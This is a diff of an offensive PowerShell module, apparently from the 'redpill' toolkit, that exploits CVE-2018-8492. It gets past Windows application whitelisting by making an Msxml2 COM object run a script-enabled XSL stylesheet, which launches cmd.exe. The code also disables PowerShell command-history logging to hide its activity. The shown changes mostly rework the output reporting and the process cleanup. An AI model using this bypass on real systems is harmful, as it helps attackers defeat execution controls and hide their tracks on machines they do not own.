@@ -2,11 +2,11 @@
 .SYNOPSIS
    CVE-2018-8492 - Application Whitelisting Bypass {XML}
 
-   Author: @bohops|@r00t-3xp10it
+   Author: @bohops (disclosure) | @r00t-3xp10it
    Tested Under: Windows 10 (19042) x64 bits
-   Required Dependencies: Msxml2 -com Object {native}
+   Required Dependencies: Msxml2 -Com Object {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.1.10
+   PS cmdlet Dev version: v1.2.11
 
 .DESCRIPTION
    AppLockerXml.ps1 module Checks\Exploits CVE-2018-8492 security bypass vulnerability in
@@ -20,10 +20,11 @@
 
 .NOTES
    A TimeOpen of '0' (seconds) maitains the executed application open!
+   If sellected -verb 'True' then cmdlet will skip internal vulnerability tests!
    Affected: Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.
 
 .Parameter Action
-   Accepts argument: XmlBypass
+   Accepts argument: XmlBypass (trigger cmdlet functions)
 
 .Parameter Verb
    Accepts arguments: False, True - Skip vulnerability tests (default: False)
@@ -69,7 +70,9 @@
    creating Msxml2 COM Object to load xml file!
    trying to execute yUeInzP.xml stylesheet file!
 
-   ScanResults         : XML successfully executed application PID:5636!
+   ScanResults         : XML successfully executed application!
+                       : ProcessName 'cmd' -> ProcessPID '5636'
+                       : C:\Windows\System32\cmd.exe
 
 .LINK
    https://github.com/r00t-3xp10it/redpill
@@ -88,7 +91,7 @@
 
 
 ## Global cmdlet variable declarations!
-$PPId = $PID ## Prevent this PID from closing!
+$IdParent = $PID ## Prevent this PID from closing!
 $OSMajor = [environment]::OSVersion.Version.Major
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
@@ -224,7 +227,7 @@ If($Action -ieq "XmlBypass"){
    $MSXML.setProperty("AllowXsltScript",$true)
 
    Write-Host "trying to execute $RandomMe.xml stylesheet file!"
-   $MSXML.transformNode($MSXML)|Out-Null;Start-Sleep -Milliseconds 1300
+   $MSXML.transformNode($MSXML)|Out-Null;Start-Sleep -Milliseconds 1200
 
    try{
 
@@ -232,14 +235,19 @@ If($Action -ieq "XmlBypass"){
       # Sellect -Last PID 'NOT' matching the current shell pid to prevent
       # This powershell process (parent) to close in the end of this function!
       $CheckApplIdState = (Get-Process -Name "$StopProc" -EA SilentlyContinue).Id | Where-Object {
-         $_.Id -ne $PPId } | Select-Object -Last 1
+         $_.Id -ne $IdParent } #| Select-Object -Last 1
 
    }catch{}
 
 
    Start-Sleep -Seconds 1
+   $RawIds = $CheckApplIdState | Select-Object -Last 1
    If($CheckApplIdState -ne $null){## Executed application output table!
-      Write-Host "`nScanResults          : XML successfully executed application PID:$CheckApplIdState!" -ForegroundColor Green -BackGroundColor Black
+      $GetI0Name = (Get-Process -id $CheckApplIdState).ProcessName.ToString()
+      $GetI0Path = (Get-Process -id $CheckApplIdState).Path | Select-Object -Last 1
+      Write-Host "`nScanResults          : XML successfully executed application!" -ForegroundColor Green -BackGroundColor Black
+      Write-Host "                     : ProcessName '$GetI0Name' -> ProcessPID '$RawIds'" -ForegroundColor DarkGreen
+      Write-Host "                     : $GetI0Path" -ForegroundColor DarkGreen
    }Else{## NOt executed application output teble!
       Write-Host "`nScanResults          : XML failed to execute application!" -ForegroundColor Red -BackgroundColor Black
    }
@@ -250,8 +258,11 @@ If($Action -ieq "XmlBypass"){
 
       If($CheckApplIdState -ne $null){
 
-         ## Stop Process by is 'Id' number identifier! (PID)
-         Stop-Process -Id $CheckApplIdState -Force -EA SilentlyContinue
+         ForEach($Token in $CheckApplIdState){## Loop trougth all Id's
+            If(-not($Token -eq $IdParent)){## Stop Process by is PID
+               Stop-Process -Id $Token -Force -EA SilentlyContinue
+            }
+         }
       
       }Else{## Stop Process by is 'NAME' identifier! (As Last Resource)
       
